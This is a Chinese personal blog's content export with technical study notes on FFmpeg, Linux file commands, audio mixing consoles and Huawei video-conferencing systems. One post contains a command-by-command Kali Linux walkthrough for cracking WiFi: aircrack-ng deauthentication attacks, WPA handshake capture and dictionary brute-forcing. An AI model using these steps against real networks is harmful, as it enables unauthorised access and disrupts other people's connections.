{"meta":{"title":"慢一点，才更快 | 雨落","subtitle":"","description":"","author":null,"url":"http://SakuraMuxia.github.io","root":"/"},"pages":[{"title":"留言板","date":"2020-04-21T12:17:58.000Z","updated":"2021-05-03T06:10:36.292Z","comments":true,"path":"comment/index.html","permalink":"http://sakuramuxia.github.io/comment/index.html","excerpt":"","text":"念两句诗 挑选中... jinrishici.load(function(result) { poem.innerHTML = result.data.content info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》' document.getElementById(\"poem\").value(poem); document.getElementById(\"info\").value(info); });"},{"title":"donate","date":"2020-02-13T15:13:05.000Z","updated":"2021-03-28T09:45:37.294Z","comments":false,"path":"donate/index.html","permalink":"http://sakuramuxia.github.io/donate/index.html","excerpt":"","text":""},{"title":"about","date":"2020-02-12T14:14:36.000Z","updated":"2021-05-03T06:11:07.657Z","comments":false,"path":"about/index.html","permalink":"http://sakuramuxia.github.io/about/index.html","excerpt":"","text":"[れんげ] 与&nbsp; SakuraMuxia&nbsp; （ ） 对话中... bot_ui_ini()"},{"title":"分类","date":"2020-04-20T16:00:00.000Z","updated":"2021-03-28T09:12:56.615Z","comments":false,"path":"categories/index.html","permalink":"http://sakuramuxia.github.io/categories/index.html","excerpt":"","text":""},{"title":"music","date":"2021-04-09T11:26:31.000Z","updated":"2021-05-03T06:11:56.371Z","comments":false,"path":"music/index.html","permalink":"http://sakuramuxia.github.io/music/index.html","excerpt":"","text":"每日一言 获取中..."},{"title":"links","date":"2020-02-13T15:11:06.000Z","updated":"2021-03-28T09:35:28.491Z","comments":true,"path":"links/index.html","permalink":"http://sakuramuxia.github.io/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-02-13T12:24:16.000Z","updated":"2021-03-28T10:08:19.939Z","comments":false,"path":"tags/index.html","permalink":"http://sakuramuxia.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"日常1","slug":"日常","date":"2021-07-27T00:40:00.000Z","updated":"2021-07-27T02:34:25.247Z","comments":true,"path":"post/cdd3.html","link":"","permalink":"http://sakuramuxia.github.io/post/cdd3.html","excerpt":"","text":"配置FFMPEG，M4S转MP41、安装或解压FFMgep,配置环境变量 目录地址 D:\\Program\\ffmpeg-N-101694-g322be6107a-win64-gpl-shared-vulkan\\bin 环境变量 2、验证 Kali0、安装aireplay 安装aircrack-ng# 安装依赖 1. apt-get -y install libssl-dev libnl-3-dev libnl-genl-3-dev ethtool # 安装 2. apt-get install aircrack-ng 1、加载无线网卡，shell验证 ifconfig -a 2、开启网卡监听模式 airmon-ng start wlan0 //开启网卡监听模式 3、查看网卡信息 iwconfig //查看网卡信息,wlan0mon网卡名加了mon则表示成功 4、扫描周边WiFi airodump-ng wlan0mon //扫描周边WiFi,按ctrl+c结束任务 BSSID为wifi的MAC地址，PWR为信号强弱程度，数值越小信号越强；#DATA为数据量，越大使用的人就越多，CH为信道频率（频道），ESSID为wifi的名称，中文可能会有乱码 5、抓取数据包 airodump-ng --bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon 如：airodump-ng --bssid CC:34:29:95:97:FA -c 1 -w /home wlan0mon airodump-ng --bssid CC:34:29:95:97:FA -c 1 -w /home/zd/shujubao/shujubao wlan0mon 抓不到换命令，把路由器下挂的设备踢下线，然后重新抓包-a 后边跟的是路由器，-c后边跟的是设备-e 表示隐藏ssid aireplay-ng -0 0 -c B8:37:65:94:5D:13 -a BC:5F:6F:3D:03:74 -D wlan0mon # 强行断线命令 # 新开一个Terminal窗口：[参数：攻击2次，路由ssid和设备Mac地址] aireplay-ng -0 2 -a CC:34:29:95:97:FA -c 44:59:E3:67:CE:85 wlan0mon airodump-ng wlan1mon --bssid 88:BF:E4:B0:C0:B7 -c 5 -w wificrack --bssid 为wifi SSID -c 为通道 -w 为保存的文件名,最后为文件名称 # 爆破命令 aircrack-ng -w /home/zd/zidian/JDXZD.txt /home/zd/shujubao/shujubao- 6、抓取数据包 如果抓取不到数据，新建一个终端：键入 airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon） airepaly-ng -0 10 -a bssid 10:0C:6B:29:8E:87 wlan0mon (0 WiFi设备无限次数,-0 8则攻击8次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码,数据包里面的密码是哈希加密的，哈希加密只能正向) 7、出现WPA handshake时，表示抓包成功 两个终端都按Ctrl+c停止，不然那边会一直断网的，cd打开抓包的目录，ls列出来，就看到我们抓到的数据包。 8、破解 解压kali自带的字典文件 路径：/usr/share/wordlists/rockyou.txt.gz 如 ：gzip -d/usr/share/wordlists/rockyou.txt.gz 键入 aircrack-ng -w 字典路径 握手包路径，回车后开始爆破 如：aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/wifi-0.1.cap aircrack-ng -w ~/Documents/wifi.txt /home-01.cap aircrack-ng -w 9、等待完成 airodump-ng -c 7 --bssid xxxxxxxxxxxx wlan0mon linux 删除1、Linux删除文件夹命令 rm -rf /var/log/httpd/access 将会删除/var/log/httpd/access目录以及其下所有文件、文件夹 2、Linux删除文件命令 rm -f /var/log/httpd/access.log 将会强制删除/var/log/httpd/access.log这个文件 3、Linux批量删除文件命令 Linux中批量删除文件，可以直接执行删除命令：rm -rf 文件1 文件2 …… 其中参数 r 和 f ：r是递归删除，比如你要删除某个目录，而目录里面还有子目录或者文件的话就要加r这个参数，f参数是强制删除的意思，另外，如果文件很多，可以通过通配符来批量删除，例如：rm -rf 1 就是删除所有以1开头的文件或目录，* 直接通配了任意数量的任意字符。 4、Linux删除隐藏文件命令 我们知道在linux下隐藏文件是以“.”开头的，单纯的使用ls命令是看不到的，需要加上“-a”参数才可以。Linux删除隐藏文件可以使用命令：rm -fr .*(删除当前目录下的所有隐藏文件)， rm -f .tmp(删除tmp文件)，rm -fr .tmp(删除tmp目录或者文件) ls -l //显示文件或目录的详细信息 chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。 以主文件夹下的一个名为“cc”的文件夹为例。下面一步一步介绍如何修改权限： 1. 打开终端。输入”su”(没有引号) 2. 接下来会要你输入密码，输入你的root密码。 3. 假设我的文件夹在主目录里，地址为 /var/home/dengchao/cc 。假设我要修改文件权限为777，则在终端输入 chmod 777 /var/home/userid/cc 文件夹的权限就变为了777。 如果是修改文件夹及子文件夹权限可以用 chmod -R 777 /var/home/userid/cc 1. 777有3位，最高位7是设置文件所有者访问权限，第二位是设置群组访问权限，最低位是设置其他人访问权限。 其中每一位的权限用数字来表示。具体有这些权限： r(Read，读取，权限值为4)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。 w(Write,写入，权限值为2)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。 x(eXecute，执行，权限值为1)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。 2. 首先我们来看如何确定单独一位上的权限数值，例如最高位表示文件所有者权限数值，当数字为7时，7用“rwx”表示 –{4(r)+2(w)+1(x)=7}–又如果数值为6，则用“rw-”表示–{4(r)+2(w)+0(x)=6}–，”-”表示不具备权限，这里表 示不具备“执行”权限。 假如我们设定其他用户的访问权限为 “r–”，则数值为4+0+0=4 一开始许多初学者会被搞糊涂，其实很简单，我们将rwx看成二进制数，如果有则用1表示，没有则有0表示，那么rwx则可以表示成为：111而二进制的111就是7。 3. 我们再来看下怎么确定3个数位上的权限。假如我们要给一个文件设置权限，具体权限如下： 文件所有者有“读”、“写”、“执行”权限，群组用户有“读”权限，其他用户有“读”权限，则对应的字母表示为”rwx r– r–“，对应的数字为744 一般都是最高位表示文件所有者权限值，第二位表示群组用户权限，最低位表示其他用户权限。 数字设定法 我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。 例如，如果想让某个文件的属主有“读/写”二种权限，需要把4（可读）+2（可写）＝6（读/写）。 数字设定法的一般形式为：chmod ［mode］ 文件名 例1： $ chmod 644 mm.txt $ ls –l 即设定文件mm.txt的属性为： -rw-r--r-- 1 inin users 1155 Nov 5 11:22 mm.txt 文件属主（u）inin 拥有读、写权限 与文件属主同组人用户（g） 拥有读权限 其他人（o） 拥有读权限 例2： $ chmod 750 wch.txt $ ls –l -rwxr-x--- 1 inin users 44137 Nov 12 9:22 wchtxt 即设定wchtxt这个文件的属性为： 文件主本人（u）inin 可读/可写/可执行权 与文件主同组人（g） 可读/可执行权 其他人（o） 没有任何权限 chown 命令 功能：更改某个文件或目录的属主和属组。这个命令也很常用。例如root用户把自己的一个文件拷贝给用户yusi，为了让用户yusi能够存取这个文件，root用户应该把这个文件的属主设为yusi，否则，用户yusi无法存取这个文件。 语法：chown ［选项］ 用户或组 文件 说明：chown将指定文件的拥有者改为指定的用户或组。用户可以是用户名或用户ID。组可以是组名或组ID。文件是以空格分开的要改变权限的文件列表，支持通配符。 参数说明： user : 新的档案拥有者的使用者 ID group : 新的档案拥有者的使用者群体(group) -c : 若该档案拥有者确实已经更改，才显示其更改动作 -f : 若该档案拥有者无法被更改也不要显示错误讯息 -h : 只对于连结(link)进行变更，而非该 link 真正指向的档案 -v : 显示拥有者变更的详细资料 -R : 对目前目录下的所有档案与子目录进行相同的拥有者变更(即以递回的方式逐个变更) –help : 显示辅助说明 –version : 显示版本 例1：把文件yusi123.com的所有者改为yusi。 $ chown yusi yusi123.com 例2：把目录/demo及其下的所有文件和子目录的属主改成yusi，属组改成users。 $ chown - R yusi.users /demo 例如：chown qq /home/qq (把home目录下的qq目录的拥有者改为qq用户) 例如：chown -R qq /home/qq (把home目录下的qq目录下的所有子文件的拥有者改为qq用户) Telnet到交换机用户模式下 telnet xxx.xxx.xx.xx","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"http://sakuramuxia.github.io/tags/Kali/"}],"author":"SakuraMuxia"},{"title":"常用教程","slug":"调音台","date":"2021-07-27T00:05:00.000Z","updated":"2021-08-03T02:13:03.654Z","comments":true,"path":"post/aaacac.html","link":"","permalink":"http://sakuramuxia.github.io/post/aaacac.html","excerpt":"","text":"调音台模拟调音台 数字调音台 声音波段 长波波段（低音）20Hz～160Hz（3个倍波段）20-40 40-80 80-160 中波波段（中音）160Hz～2500Hz（4个倍波段）160-320 320-640 640-1280 1280-2500 短波波段（高音）2500Hz～20000Hz（3个倍波段）2500-5000 5000-10000 10000-20000 接口低电平的话筒或者是不带放大器的话筒，无论是电容话筒还是动圈话筒，不带功率放大部分的，建议接MIC的口，就是卡农式的这种口。 如果是高电平比如说DVD输出的话，电子乐器其他的无线话筒，要接大三芯的接口，大三芯是平衡的接法，建议都接平衡式的接法。可以避免一些软问题。 PK灯亮代表信号过载的提示。 增益GAIN（配合PK灯，当PK灯亮的时候，衰减6个dB）一般在中间包括负值（获得足够的信道比和不失真度） 幻想供电 反相器 低切开关 过滤掉100HZ以下频率的声音，男生的低频最低在80HZ-100HZ。 均衡器 高频部分 第1个均衡器对应的是高频的 10K以上的频率，对他进行提升和衰减。一般在中间0，3到6个db已经很高，衰减的多了就会发闷。10K以上对人的泛音* 或者磁性部分，乐器的高频谐波部分。打击乐的踩鑔，非常好。 中频部分 可以扫频，可以选择频率的均衡器，标准的参量均衡器，只不过不带带宽调整，带宽是固定的， 注解： 泛音，英文称为Harmonics，泛音意思是讲一种声音，在弦乐的演奏技巧上最常用到的人工泛音为Touch fourth。一跃两个八度音程，如笛声。 AUX Auxiliary(辅助) 前四个AUX是固定的，作为Pre（前置）AUX， AUX作为调音台的辅助母线，他的用处也非常的多，用作录音的，用作转播的，有做监听的，或者用作乐队返送的，用的最多的就是对效果器进行效果发送的。 前置Pre指的是他的效果不受推子的控制，推子的推上去或者打下来，不会影响他发送的效果，对乐队监听的比较多，防止对主声场的控制，影响乐队情绪。 效果器 后边几种AUX，可以定义为和前边的几种一样，作为前置，也可以定义为推子之后，推子之后用的比较多，推子之后，用的比较多的是对主会演出的效果器，推子不推上去，话筒是没有效果的。 混响效果，演出说话的时候。 在总线中，AUX8 切换成Pre 输出AUX路的效果 效果器一般就是通过AUX发送出去，通过混响器效果混合之后，然后我们所得得到的效果，然后我们再返回到其中一路来，用了25 26 两个通道，进来之后，均衡器不做进行处理，可以直接打到直通，都是在正中间，效果器返回来的这一路，一定要注意，效果器返回来的这一路的AUX一定要关闭，特别是 7 8 这两路， 7 8 这两路已经作为话筒发送出去了，7 8 这两个都是效果发送，已经发送出去了。就要关闭。 双引擎的就是两个通道相互独立，7 和 8 出来之后都是立体声的效果，就是两种不同的立体声的效果混加在一起。 声线按钮 通道编组 第一个是中央C 中央C编组 哑音编组 中央控制组 7*4矩阵 7*4的矩阵 7条总线， 矩阵的输出是在编组之后，再进行编组， AFL是监听， 鲁班调音 设备连接图 调音台：混音的作用，把电脑的信号，话筒的信号混合在一起。 反馈抑制器：防止啸叫 混音器：提供混音功能，会议的话筒需要48V供电，当8个话筒都接入调音台上同时打开的话，啸叫会非常严重，即便是用了反馈抑制器，也压不住啸叫，所以会用到混音器，混音器是如果你说话的时候， 他就会自动开启声音，如果你不说话的时候就会自动禁音， 功放：放大的功能 电源时序器：是管理所有设备的电源，按照顺序开机，按照顺序关机。 接线 调音台的总输出 电源时序器的接法 混音器上的调试 反馈抑制器 调音台 打开监听，推输出。 调试反馈抑制器 静态陷波器个数就是出现啸叫的那个点，把声音调到最大就会出现啸叫。 旋转选择，按下去代表确定 调音台2 清晰明亮 高频 低频 增加分贝 声音厚重 但是也模糊不请了 减少分贝了没有那种沙哑的声音 数字调音台","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"-调音台","slug":"调音台","permalink":"http://sakuramuxia.github.io/tags/%E8%B0%83%E9%9F%B3%E5%8F%B0/"}],"author":"SakuraMuxia"},{"title":"HCIA-Video-Conference","slug":"HCIA-Video","date":"2021-07-25T02:18:00.000Z","updated":"2021-07-25T02:28:19.851Z","comments":true,"path":"post/a548.html","link":"","permalink":"http://sakuramuxia.github.io/post/a548.html","excerpt":"","text":"HCIA-Video-Conference视频通信相关的基础知识 视频会议体系架构 视频会议产品及技术 视频会议解决方案应用组网 视频会议技术及产品 H.239双流和VGA传送最大的区别在于H.239辅流可以共用一路带宽 视频会议体系视频会议应用模型 终端的主要作用是用来声音，图像采集，编码等处理，然后将视频的码流通过网络发送给MCU。 MCU作为多点控制单元 ，主要为视频会议中的音视频处理和转发，提供媒体资源，比如说广播会场，多画面显示等。 GK也叫做网守，在多点视频会议中主要提供呼叫控制服务，比如说终端注册，呼叫，准许接入等。 通信网络是为终端，MCU，GK 这些网元设备之间相互通信提供传输通道。 点对点会议模式 小容量会议模式 大容量会议模式 华为视频体系架构 华为视频会议体系架构整体分为4层，分别为终端接入层，媒体处理层，回话控制层，和应用层。 终端接入层主要包含：各类型的视频会议终端，智真系列的终端，TE系列终端等。 当需要召开多点会议的时候就需要MCU为多点会议提供媒体资源及处理，比如说视频的转发及适配，多画面合成，辅流的转发适配等。终端接入层的上边就是媒体处理层，如VP96系列MCU，VP98系列MCU，视频会议录制及点播回放等功能，基于泰山服务器的部署的录播服务器CloudRSE。CloudRSE只能配套SMC3.0配套使用，无法配套SMC2.0组网。 在视频会议中会涉及到终端的注册，呼叫控制等，都是由回话控制层的SC（switch center）提供的。还提供带宽管理，穿越等，这些也都是由SC提供的。在外网接入时，SC还同时作为接入网关，提供外网接入的功能， VP96系列MCU指的是V6R6及以后软件版本的硬件机框式MCU，比如VP9660，VP9650，不同于之前V5R2的老版本，VP98系列MCU是基于华为泰山服务器定制的软件MCU，如Vp9860，VP9850，而Cloud MCU可以基于通用服务器部署的软件MCU，比如说RH系列服务器，泰山系列服务器。 终端，MCU，SC这些设备都是由应用层的SMC（Services Management Center）进行管理。业务管理中心，它不仅仅提供设备管理的功能还提供用户管理，会议预约，会议控制等，同时应用层还包含一个重要的网元设备也就是EUA（统一地址本），主要提供企业通信录的功能。 华为视频会议产品 CloudMCU支持1080P30全编全解。 SMC主要提供网元管理，会议预约，会议控制，以及提供第三方接口等。SMC3.0是华为的欧拉操作系统和高斯数据库进行部署。 基于统一标准的LDAP协议的，统一地址薄，企业通过部署EUA，可以实现SMC与企业通讯录以及第三方AD服务器与企业通讯录之间的信息同步，这样可以SMC上召开会议时，可以直接从企业通讯录中选择相应的会场。 在视频会议中所用的视频会议终端，注册，呼叫的控制，等都是由SC来完成的。除此之外SC还提供区域管理。网络安全管理，支持H.460穿越等功能。 支持单流或者双流录制模式。 视频会议技术特点 公私网穿越方案 目前视频会议中主推的是基于SC的穿越方案，主要有两种，一种是单SC的方案，另外一种是双SC的方案，其中单SC的穿越方案一般适用于企业对安全性的要求不高，需要开放比较多的防火墙端口，通过单网卡公私网穿越策略，这样在无需改造现有网络的情况下实现公私网穿越，而双SC的穿越方案在单SC的穿越方案的投入较多，但是要求防火墙开放的端口比较少， MCU根据不同会场的能力，对于演示进行智能辅流适配，对于H.323 SIP等协议进行只能适配，可以将支持不同协议的终端加入会议，第二种是即使是不支持演示的会场，依然可以通过适配处理，将演示图像适配为该会场的主流，演示内容的显示。第三种是通过演示适配处理，可以实现演示加入多画面，演示带宽动态管理等功能，让会议中所有的终端，都可以看到演示信息，最大限度保证演示的效果。 在保证带宽，线路资源的情况下，级联MCU之间支持建立多条级联通道，使得级联MCU之间可以同时传送多路媒体码流，实现上下级会场都可以观看画面，从而提升视频会议的体验。 视频会议应用 支持扩展独立MCU，录播服务器，和支持扩展DMZ场景的独立SC。最大支持500方并发呼叫，支持1000方用户注册。 超过1000用户的场景，不超过1W用户的场景，可以将SMC，SC，EUA，部署于同一台服务器上，节省服务器资源，最大支持1000路并发呼叫，和1W用户注册。 H.323协议 H.323协议与SIP协议的基础知识 视频会议调度信令流程 会议中的会控功能是由MC提供的，会议中的多画面功能是由MP提供的。 网关可以对运行不同网络或者不同协议的设备他们传输的数据进行转换。 两种呼叫方式：一种是通过IP地址进行呼叫，另一种是通过呼叫他的号码来进行呼叫。 通过IP地址进行呼叫，就直接可以呼叫，而通过呼叫号码来进行呼叫的话就需要将号码先转化为IP地址，然后再进行呼叫。 GK的角色就是把号码转换为IP地址进行呼叫。对于GK而言他有一张表，把IP地址和号码进行对应。 H.323协议栈 //现在有两个终端，T1和T2，T1的地址为10.1.1.1 ,T2的地址为10.1.1.2,T1的号码为021101，T2的号码为021102，对于T1和T2如果想使用分配的号码来进行通讯就需要向Gk注册,注册的过程用到的协议就是H.225.0RAS //在完成注册后，GK会生成一个注册表，这个注册列表会记录T1和T2的注册信息。T1和T2注册成功后，T1就可以通过号码呼叫T2，T1在呼叫T2的时候会首先发送一个请求到GK，询问是否可以呼叫T2，GK通过查找注册信息，找到T2，回复T2并且把IP地址回复给T1.T1发送请求到GK，GK回复信息的过程是第二个过程，呼叫的发起，用到的协议为H.225.0RAS //第三步通过IP地址呼叫T2，用到的协议为H.225.0CS //第四步 协商音视频的编解码，用到的协议为H.245, //第五步 音视频传送的问题，用到的协议为RTP和RTCP 会议的调度 用到的协议为H.225.0 CS SMC的作用会议的管理，设备的管理。 DB指的是数据库 视频会议系统中如何完成多点会议的召集： SMC到自己的数据库找到需要召集的终端信息T1T2T3，然后SMC会把需要召集的信息，发给MCU，此时召集会议的终端入会，MCU会通过6步的终端交互，通过点对点号码呼叫的方式，实现会议终端的召集，MCU收到SMC给他的会议召集信息，此时MCU回向GK发送ARQ信息呼叫请求消息。GK接收到MCU发送的ARQ请求消息后，会在自己的数据库中查找号码对应IP地址是否存在。查到之后会回复ACF确认信息。MCU在获得GK反馈的IP信息后，会向终端发送Setup的请求信息。终端在接受到MCU的请求信息后，三个终端会发送ARQ呼叫请求信息到GK，询问是否可以和MCU建立连接，终端在接受到GK的确认信息后，终端才会给MCU回复ACF信息。完成呼叫的建立。 MCU在系统中除了会议的召集，还拥有会控的功能。 SMC会控通过广播一个会场，SMC通过下发一个广播会场的指令到MCU，MCU会把T1和T2的图像广播到MCU，从而去实现，T2和T3去观看T1会场的画面。 多个MCU的级联，每个终端只能与一个MCU完成呼叫。如果T1想和T3完成通讯就需要MCu1和MCU2产生某种联系才可以。 MCU1和MCU2产生的某种联系是点对点的某种联系类似于号码呼叫的关系。MCU回向GK发送一个ARQ的请求，GK再回复一个ACk的确认信息，然后MCU1向MCU2发送一个setup的请求，然后MCU2再向GK发送一个ARQ的请求消息，询问是否和MCU1建立联系。当GK向MCU2回复确认信息后，MCU2再回复MCU1确认建立联系。这个时候T1和T3就可以建立联系了。 SIP协议 TLS协议是一种安全传输帧协议。 协议消息 注册服务器是指终端向sip服务器注册信息，类似于H.323协议下的GK的作用。 代理服务器是指终端注册完之后，终端1和终端2也不是直接发送消息的，而是终端1把数据先发送给sip服务器，sip服务器再转发给终端2。 重定向服务器是指将请求的地址信息，转换成另一个IP地址。 这三个服务器可以部署到同一个设备上。 呼叫流程 如果注册服务器没有密码则只需要两步验证。 invite消息：邀请信息 100Trying：告知USA接收到消息，正在处理 180Ringing：告知处理完成，正在振铃 200ok：若有人接听了呼叫，则发送200ok确认消息。 SDP协商指的是，呼叫双方对两端终端传输音视频编解码的协商达成一致。在SIP协议中负责媒体回话协商的就是SDP协议。 视频会议终端概述TE系列 搭配调音台，矩阵，中控系统。 USB：配置文件的导入的功能 嵌入式的操作系统，拥有自己的视频会议系统。 多视能力：是指可以同时接入两个摄像机，把两个摄像机的画面组合成一路。 PSTN： 卡侬头：卡侬头是一种音频的标准接口，为一些电容麦克风和高端的话筒设计的。 黑色底纹的一般都是输入，而蓝色底纹的一般都是输出。 第一组输出一般是接会场的外放，第二组的输出一般是会场的录音。这两个是不能接反的，接反会导致一些回音和啸叫。在旁边是一个HD-AI的接口。 默认的话我们会把图形界面显示在1路口上。 （蓝色VGA旁边的输入接口）HD-Vi华为的专用的接口。被一个圈圈框起来代表同时只能接一个不能接两个。 一种是摄像机的COM口用来接摄像机的控制线（不是华为的摄像机，需要将摄像机的com口接到终端上进行遥控器控制），一种是LAN口一般接的是网线。 PSTN传统的一些电话线路。 3G-SDi指的是可以传输3G/s的速率，传输数字高清信号。 CVBS传输标清的模拟信号。 兼容常用的矩阵和调音台。 两个莲花头对应调音台的输入， H.265对比H.264协议的对比是在同样的分辨率下可以节省带宽。 CloudLink系列高清终端 1:安全锁扣 2：复位键 3：电源接口 4：网口 5：Touch接口，接Touch控制 6：USB接口 7：传统视频输出接口HDMI 8：传统视频输出接口HDMI 9：视频接入口，接笔记本电脑当一些辅屏，投屏使用 10：音频的输入，HD-AI 口接华为三角麦克风 11：音频的输入，3.5mm耳机 12：音频的输出 根据不同的License进行控制， 智能导播，智慧眼 视频会议终端配套外设摄像机 自动白平衡，画面偏黄，偏白可以通过调节自动白平衡来设置。 长距离3G-SDI线缆。 YPbPr分量线路 视频加音频 小于50米的会议室，镜头自动跟踪。 6米拾音，360° 应用场景 公共特性 通过用终端的的热点wifi或者HDMI线进行屏幕共享，通过发送辅流来进行控制，根据需要进行抢占。 通过电脑或者手机设备上下载IdeaShare APP 辅助投屏工具，即插即用，不需要安装驱动APP等 前提的条件是所有的终端都需要在一个GK上，并且使用短号才能入会。大家都是通过IP地址呼叫的就无法实现。 当会议室的数量越来越多时，我们会很难记住各个会议时的IP地址，获得他们的号码，这个时候我们就需要借助地址本的功能，终端的地址本可以自由的编辑，添加号码的信息，也可以从服务器上进行同步，同步服务器的方式有两种，一种是可以搭建一套FTP服务器，通过和FTP服务器进行对接，进行统一管理地址本的号码，另外一种是华为推荐的EUA服务器，如果购买了SMC硬件的话，EUA就会集成在里面，终端会通过LDAP的协议，同步获取EUA上电话本的信息。只要所有终端都注册到GK或者SIP服务器上时都可以获得EUA上的号码。 H.264HP硬件算法芯片 SVC：视频编码，是指将一种视频流分割成多个分辨率的质量和帧率的技术，属于H.264编码的一种，H.264 AVC 强编强解的一种技术。SVC相对于AVC而言的话更节省网络的带宽，更低的延迟。 SEC：是一种基于QoS网络技术至上的一种纠错技术，这个技术主要是针对于IP网络的，IP网络中他会自动调整带宽，调整音视频的策略，从而保证音视频在各种恶劣的网络条件下，达到最优的效果。 启用了SEC之后会占用一定的带宽。当带宽良好，丢包比较多的情况下开启SEC功能。 当网络带宽不足时，会自动降低分辨率，也会自动降低自己的码率。 独有特性TE系列特性多视功能-多视角画面 多个摄像头，输入合并成一路。 终端其实是一个编解码器，每一台只有一路的编解码能力，那这个时候我们想传输多个摄像机画面，那么我们终端可以吧多个摄像机合成一路多画面，把它发送给MCU，或者发送给对方的终端。这样就能实现一个会场所有的摄像机的画面都能传输，多视画面是可以自定义的，在开会的过程中，可以在终端中调整。 在关机的情况下，VGA线缆环回，从VGA的输入，还能从VGA的输出输出，就相当于终端就是一个转接头的作用。 全适配：一对一的编码和解码。 CloudLink系列特性 VME：去噪及增强处理技术 需要部署一套人脸识别服务器。再输入人脸姓名和信息 需要部署一套人脸识别服务器。再输入人脸姓名和信息 H.264的一种扩展协议，称之为分层的编码，他是在AVC的强编强解的基础上进行一个扩展，利用AVC编解码的各种高效算法工具，从而产生不同的帧率，不同的速率，不同的质量的多个视频，举个例子，当我们召集一个SVC会议时，我们终端会给MCU发送一个4路的码流，其中包含主流一路辅流三路，分辨路会在90P和720P之间变化。传统的AVC只会有一路主流，一路辅流，而SVC会有4路的码流。4路码流发送过去之后，对方的MCU或者终端会根据自己的终端的特性选择适合自己的码流。这样的话可以节省MCU资源。本质上将SVC的多流会议是由终端来完成编码功能。在终端侧就把编解码的功能和多画面的合成完成了。MCU只需要一个转发就可以了。不需要一个编解码，从而减轻MCU的负担，降低会议的时延，实现更多的终端来接入，SVC会议的时候， CloudMCU转发各个视频的码流最多16路分辨率由实际的带宽决定。最高分辨率只能达到720P，如果是AVC的多流会议就能达到1080P 4K的分辨率。这样会议的资源占用的就会多一点。 H.265 SCC 编码技术 主要针对的是屏幕内容的编码。传统的H.264 H.265里面编码主要是对主流画面（摄像机画面）的编码，而SCC是对辅流进行编码协议。屏幕共享会有一些特性，比如说PPT和图像。静态的重复的画面。跟摄像机立体的画面还是有些区别的，从而保证更好的压缩和解码，让PPT和辅流的画面显示的更加流畅。 IdeaHub 华为企业智慧屏支持华为云和传统的企业自建两种部署方案， 华为云部署下的方案： 有无线投屏器IdeaShare（成对存在插在智慧屏和PC上），IdeaShare APP（同属于一个网段），有线投屏三种方式。 白板协作， 可以使用OPS（MINI PC）运行windows应用。 在入驻式组网情况下，支持H.265编解码协议，带宽共享，专有IRC技术，48K采样率覆盖所有音频信号，电子签到，电子名牌， H.235 TLS StarTTL SRTP 安全加密技术。 MCUMCU的定义 对画面的处理也是由MP进行处理的。 SMC的主要作用是设备管理和会议管理，SMC下发指令。 SMC下发广播T1的指令，MCU会把T1的视频流转发给T2和T3，这样就都能看到T1的画面了。 MCU除了由会控的功能还有对音视频处理的功能。 MCU的型号 SC的作用是设备的注册，呼叫控制，外网接入等作用。 最高支持32个1080P 30fps 的会场 一个MCU最高支持多少个会场都是由媒体板控制的。 对于一个VP9630最高支持32个会场入会，这样说是不准确的，因为召开的不一定1080P30的会议，不同分辨率之间有相互转化的关系，SD端口：标清端口。 一个1080P60的端口资源可以召开2个1080P30的会场入会，对于一台VP96的MCU，如果他最多支持32路会场入会，就必须要说最高支持1080P30的会场入会，如果是召开的是1080P60的会议，最高支持16路会场入会。 MCU特性 全适配：为每个会场提供编解码资源。 全交换：按需分配编解码资源一致就会直接转发，如果不一致就会重新编解码适配。 对MCU端口资源的管控，当终端申请入会的时候会向SMC发送入会请求，SMC同意后才能入会，同时SMC还可以控制端口资源，按照实际需求分配端口资源。 SVC会议，主要的特点就是MCU只需要帮助终端转发音视频，而不需要实际的编解码资源实际去处理，会场图像的编解码以及会场布局上的操作都在终端侧自身完成。这样就能实现大量SVC视频的接入。具体的就是终端会发送4路不同分辨率的视频资源90P~720P之间，一个1080P的端口资源可以转换为12个SVC终端的接入。 VP96系列MCU不支持 MCU典型应用组网 SMC产品 SMC统一部署在服务器上边的。 SC集成了两个服务器一个是GK服务器一个是SIP服务器。 60M穿越是指在华为视频会议系统在通过SC在实现公私网穿越的时候，为内外网视频会议提供的信息交互带宽，例如内外网传输的媒体流，这些都需要SC提供带宽。 并发端口数1000方。 SMC：视频会议业务的对外实现。 SC：设备注册，呼叫控制，外网接入。 CloudRes只能用在SMC2.0。 SMC系统结构 SMC：负责整网的设备管理，管理终端，MCU，录播服务器等。 SC：负责全网设备的注册，呼叫控制等。 MCU：为全网提供会议资源。 录播：为全网提供录播或者直播资源的。 SMC3.0 SMC功能特性 哪个会场的声音比较大，就会切换到哪个 业务控制 SMC管理资源池资源 录播产品特性 双流是指同时观看图像和会议共享材料。无法现场入会的用户可以在任意地点观看直播视频。在任意时间观看点播视频，使会议内容在更大范围内得到分享，有效提高沟通和办公效率， cloudRSE处于媒体处理层 Cloudrse功能特性 直播视频：以全屏或者画中画的形式，播放 点播：支持视频和会议材料的布局一键切换。 支持双码率直播，点播，其中一路标清另外一部高清。播放页面中用户可以选择高清或者标清的视频格式。 默认自动发布，也可以手动配置为待发布。 用户可以通过视频编辑，实现封面图面，视频名称，主讲人等信息。和设置视频权限等操作。支持下载TS格式和MP4格式的视频。 视频会议常用配置 添加SC单击“设备”，选择“SC”。 